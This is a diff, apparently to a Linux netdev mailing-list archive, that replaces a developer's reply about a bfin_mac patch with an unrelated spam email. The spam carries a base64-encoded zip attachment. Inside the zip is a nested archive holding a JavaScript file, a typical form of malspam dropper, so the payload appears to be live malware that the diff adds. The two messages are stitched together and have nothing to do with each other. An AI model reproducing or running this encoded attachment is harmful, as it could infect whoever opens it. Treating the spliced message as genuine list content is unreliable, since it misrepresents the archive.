@@ -1,36 +1,45 @@
-From: Karim Eshapa <karim.eshapa@gmail.com>
-Subject: RE:drivers:net:ethernet:adi:bfin_mac: Use FIELD_SIZEOF defined kernel macro
-Date: Mon, 24 Apr 2017 02:23:10 +0200
-Message-ID: <1492993390-10064-1-git-send-email-karim.eshapa@gmail.com>
-References: <1492970524-12607-1-git-send-email-karim.eshapa@gmail.com>
-Cc: tremyfr@gmail.com, a@unstable.cc, fw@strlen.de,
-        clabbe.montjoie@gmail.com, edumazet@google.com, jarod@redhat.com,
-        adi-buildroot-devel@lists.sourceforge.net, netdev@vger.kernel.org,
-        linux-kernel@vger.kernel.org, Karim Eshapa <karim.eshapa@gmail.com>
-To: davem@davemloft.net
+From: <kelley@colfaxcommunitynetwork.org>
+Subject: 10985 netdev
+Date: Mon, 24 Apr 2017 00:24:32 -0000
+Message-ID: <149299347273.16693.8930476010379585626@dataconnection.net.br>
+Mime-Version: 1.0
+Content-Type: application/zip; name="024976477871603.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-wr0-f195.google.com ([209.85.128.195]:35263 "EHLO
-        mail-wr0-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1163687AbdDXAXV (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sun, 23 Apr 2017 20:23:21 -0400
-In-Reply-To: <1492970524-12607-1-git-send-email-karim.eshapa@gmail.com>
+Received: from ip187-86-91-221.dataconnection.net.br ([187.86.91.221]:3492
+        "HELO dataconnection.net.br" rhost-flags-OK-OK-OK-FAIL)
+        by vger.kernel.org with SMTP id S1163715AbdDXAYi (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Sun, 23 Apr 2017 20:24:38 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Sun, 23 Apr 2017 22:56:38 +0200, Geert Uytterhoeven:
->IMHO this makes the code less safe and less future-proof.
->What if the type of info is ever changed?
->There's no safety check to validate that the FIELD_SIZEOF() operates on the
->same data as the strlcpy() destination.
-
-Really make sense :)
-
->As the kbuild test robot already told you, this doesn't compile.
->Please try to (at least) compile the code before sending patches.
->Thanks!
-
-So sorry for that I built quickly using the wrong compiler and the wrong 
-target machine with my old .config that's horrible :)
-
-Thanks a lot,
-Karim
+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
+BQYAAAAAAQABAFsAAACmBQAAAAA=
